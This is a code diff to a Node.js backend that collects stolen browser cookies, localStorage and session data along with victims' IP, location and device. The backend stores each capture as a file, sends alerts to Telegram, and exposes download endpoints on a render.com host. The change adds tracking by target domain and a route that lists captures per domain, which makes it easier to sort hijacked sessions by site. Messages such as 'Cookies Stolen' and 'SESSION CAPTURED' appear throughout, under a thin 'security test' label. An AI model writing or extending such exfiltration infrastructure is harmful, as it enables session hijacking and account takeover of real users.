@@ -66,7 +66,10 @@ async function createDataFile(data) {
   
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
   const testType = data.type || 'security_test';
-  const filename = `${testType}_${timestamp}.json`;
+  
+  // Extract domain for better file naming
+  const targetDomain = extractDomain(data.url || data.data?.url || 'unknown');
+  const filename = `${testType}_${targetDomain}_${timestamp}.json`;
   const filepath = path.join(COOKIES_DIR, filename);
   
   // Save complete data as JSON
@@ -75,12 +78,28 @@ async function createDataFile(data) {
   return { filename, filepath };
 }
 
+// Extract domain from URL
+function extractDomain(url) {
+  try {
+    if (!url || url === 'N/A') return 'unknown';
+    const domain = new URL(url).hostname;
+    // Remove www. if present and replace dots with underscores for filename safety
+    return domain.replace(/^www\./, '').replace(/\./g, '_');
+  } catch (error) {
+    return 'unknown';
+  }
+}
+
 // Format data for Telegram based on test type
 function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
   const { type, metadata = {} } = data;
   
   let message = '';
   const timestamp = new Date().toISOString();
+
+  // Extract target domain for all message types
+  const targetUrl = data.url || data.data?.url || data.dataCollected?.url || 'N/A';
+  const targetDomain = extractDomain(targetUrl);
 
   switch(type) {
     case 'session_capture':
@@ -91,7 +110,8 @@ function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
       
       message = `🎯 <b>SESSION CAPTURED</b>
 
-🌐 <b>Target:</b> ${sessionData.url || 'N/A'}
+🎯 <b>Target Domain:</b> ${targetDomain}
+🔗 <b>Full URL:</b> ${targetUrl}
 📊 <b>Cookies:</b> ${Object.keys(cookies).length}
 🍪 <b>Cookie Names:</b> ${Object.keys(cookies).join(', ') || 'None'}
 💾 <b>Local Storage:</b> ${Object.keys(localStorage).length}
@@ -114,6 +134,7 @@ function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
     case 'session_replay':
       message = `🔄 <b>SESSION REPLAY TEST</b>
 
+🎯 <b>Target Domain:</b> ${targetDomain}
 📊 <b>Endpoints Tested:</b> ${data.data?.length || 0}
 ✅ <b>Successful:</b> ${data.data?.filter(r => r.authenticated).length || 0}
 ❌ <b>Failed:</b> ${data.data?.filter(r => !r.authenticated).length || 0}
@@ -131,8 +152,9 @@ function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
       const exfilData = data.dataCollected || data.data || {};
       message = `🍪 <b>XSS EXFILTRATION SIMULATION</b>
 
+🎯 <b>Target Domain:</b> ${targetDomain}
 📊 <b>Cookies Stolen:</b> ${exfilData.cookies ? Object.keys(exfilData.cookies).length : 0}
-🔗 <b>Target URL:</b> ${exfilData.url || 'N/A'}
+🔗 <b>Target URL:</b> ${targetUrl}
 🕒 <b>Time:</b> ${exfilData.timestamp || timestamp}
 
 📍 <b>Client Info:</b>
@@ -147,6 +169,7 @@ function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
     case 'session_fixation':
       message = `🎭 <b>SESSION FIXATION TEST</b>
 
+🎯 <b>Target Domain:</b> ${targetDomain}
 🔐 <b>Fixation ID:</b> <code>${data.data?.fixationId || 'N/A'}</code>
 ✅ <b>Cookie Set:</b> ${data.data?.cookieSet ? 'Yes' : 'No'}
 📊 <b>Tests Run:</b> ${data.data?.testResults?.length || 0}
@@ -162,6 +185,7 @@ function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
     case 'cookie_injection':
       message = `⚡ <b>COOKIE INJECTION TEST</b>
 
+🎯 <b>Target Domain:</b> ${targetDomain}
 📊 <b>Cookies Injected:</b> ${data.data?.length || 0}
 ✅ <b>Successful:</b> ${data.data?.filter(r => r.injectionSuccessful).length || 0}
 
@@ -177,7 +201,7 @@ function formatTelegramMessage(data, ip, locationStr, deviceType, fileInfo) {
       const findings = data.data?.summary || {};
       message = `📊 <b>COMPLETE SECURITY ASSESSMENT</b>
 
-🎯 <b>Target:</b> ${findings.targetUrl || 'N/A'}
+🎯 <b>Target Domain:</b> ${targetDomain}
 ⚠️ <b>Vulnerabilities:</b> ${findings.totalVulnerabilities || 0}
 🔴 <b>Risk Level:</b> ${findings.riskLevel || 'N/A'}
 
@@ -196,6 +220,7 @@ ${findings.vulnerabilities ? findings.vulnerabilities.map(v => `├ ${v}`).join(
     case 'stealth_exfiltration':
       message = `🕵️ <b>STEALTH EXFILTRATION TEST</b>
 
+🎯 <b>Target Domain:</b> ${targetDomain}
 📊 <b>Cookies Available:</b> ${data.data?.cookieCount || 0}
 ⚠️ <b>Vulnerable:</b> ${data.data?.vulnerable ? 'Yes' : 'No'}
 
@@ -210,8 +235,9 @@ ${findings.vulnerabilities ? findings.vulnerabilities.map(v => `├ ${v}`).join(
     default:
       message = `📡 <b>SECURITY TEST DATA RECEIVED</b>
 
+🎯 <b>Target Domain:</b> ${targetDomain}
 📊 <b>Type:</b> ${type || 'unknown'}
-🔗 <b>URL:</b> ${data.url || data.data?.url || 'N/A'}
+🔗 <b>URL:</b> ${targetUrl}
 🕒 <b>Time:</b> ${timestamp}
 
 📍 <b>Client Info:</b>
@@ -270,18 +296,30 @@ router.get('/files', async (req, res) => {
       dataFiles.map(async (file) => {
         try {
           const stats = await fs.stat(path.join(COOKIES_DIR, file));
+          const fileContent = await fs.readFile(path.join(COOKIES_DIR, file), 'utf8');
+          const data = JSON.parse(fileContent);
+          
+          const targetUrl = data.url || data.data?.url || data.dataCollected?.url || 'N/A';
+          const targetDomain = extractDomain(targetUrl);
+          
           return {
             filename: file,
             downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${file}`,
             size: stats.size,
-            created: stats.birthtime
+            created: stats.birthtime,
+            type: data.type,
+            targetDomain: targetDomain,
+            targetUrl: targetUrl
           };
         } catch (error) {
           return {
             filename: file,
             downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${file}`,
             size: 'N/A',
-            created: 'N/A'
+            created: 'N/A',
+            type: 'unknown',
+            targetDomain: 'unknown',
+            targetUrl: 'N/A'
           };
         }
       })
@@ -297,6 +335,55 @@ router.get('/files', async (req, res) => {
     res.status(500).json({ 
       success: false, 
       message: "Error listing files"
+    });
+  }
+});
+
+// Get files by domain
+router.get('/files/domain/:domain', async (req, res) => {
+  try {
+    const domain = req.params.domain;
+    await ensureDataDir();
+    const files = await fs.readdir(COOKIES_DIR);
+    const dataFiles = files.filter(file => file.endsWith('.json'));
+    
+    const domainFiles = [];
+    
+    for (const file of dataFiles) {
+      try {
+        const fileContent = await fs.readFile(path.join(COOKIES_DIR, file), 'utf8');
+        const data = JSON.parse(fileContent);
+        const targetUrl = data.url || data.data?.url || data.dataCollected?.url || 'N/A';
+        const targetDomain = extractDomain(targetUrl);
+        
+        if (targetDomain.includes(domain)) {
+          const stats = await fs.stat(path.join(COOKIES_DIR, file));
+          domainFiles.push({
+            filename: file,
+            downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${file}`,
+            size: stats.size,
+            created: stats.birthtime,
+            type: data.type,
+            targetDomain: targetDomain,
+            targetUrl: targetUrl
+          });
+        }
+      } catch (error) {
+        console.error(`Error reading file ${file}:`, error);
+      }
+    }
+    
+    res.json({
+      success: true,
+      domain: domain,
+      totalFiles: domainFiles.length,
+      files: domainFiles
+    });
+  } catch (error) {
+    console.error('Error listing domain files:', error);
+    res.status(500).json({ 
+      success: false, 
+      message: "Error listing domain files"
     });
   }
 });
@@ -379,8 +466,13 @@ router.get('/debug/latest', async (req, res) => {
     const fileContent = await fs.readFile(filepath, 'utf8');
     const data = JSON.parse(fileContent);
     
+    const targetUrl = data.url || data.data?.url || data.dataCollected?.url || 'N/A';
+    const targetDomain = extractDomain(targetUrl);
+    
     res.json({
       filename: latestFile,
+      targetDomain: targetDomain,
+      targetUrl: targetUrl,
       data: data,
       sessionData: data.type === 'session_capture' ? {
         cookiesCount: Object.keys(data.data?.cookies || {}).length,
@@ -410,12 +502,16 @@ router.get('/debug/files', async (req, res) => {
           const fileContent = await fs.readFile(filepath, 'utf8');
           const data = JSON.parse(fileContent);
           
+          const targetUrl = data.url || data.data?.url || data.dataCollected?.url || 'N/A';
+          const targetDomain = extractDomain(targetUrl);
+          
           return {
             filename: file,
             type: data.type,
             timestamp: data.timestamp || data.data?.timestamp,
+            targetDomain: targetDomain,
+            targetUrl: targetUrl,
             cookies: data.data?.cookies ? Object.keys(data.data.cookies).length : 0,
-            url: data.url || data.data?.url
           };
         } catch (error) {
           return {
@@ -467,6 +563,10 @@ router.post('/', async (req, res) => {
     const agent = parser.getResult();
     const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;
 
+    // Extract target domain for logging
+    const targetUrl = data.url || data.data?.url || data.dataCollected?.url || 'N/A';
+    const targetDomain = extractDomain(targetUrl);
+
     // Create data file
     let fileInfo = null;
     try {
@@ -491,10 +591,11 @@ router.post('/', async (req, res) => {
     // Log to console for monitoring
     console.log('📥 New Security Test Data:');
     console.log('   Type:', data.type || 'unknown');
+    console.log('   Target Domain:', targetDomain);
+    console.log('   Target URL:', targetUrl);
     console.log('   IP:', ip);
     console.log('   Location:', locationStr);
     console.log('   Device:', deviceType);
-    console.log('   URL:', data.url || data.data?.url || 'N/A');
 
     // DETAILED SESSION LOGGING
     if (data.type === 'session_capture') {
@@ -519,6 +620,8 @@ router.post('/', async (req, res) => {
       success: true,
       message: "Security test data received successfully",
       dataType: data.type,
+      targetDomain: targetDomain,
+      targetUrl: targetUrl,
       telegramSent: telegramResult.success,
       clientInfo: {
         ip: ip,
@@ -556,7 +659,8 @@ router.get('/health', async (req, res) => {
         dataCollection: true,
         telegramNotifications: !!TELEGRAM_API,
         fileStorage: true,
-        downloadEndpoint: true
+        downloadEndpoint: true,
+        domainTracking: true
       },
       storage: {
         directory: COOKIES_DIR,
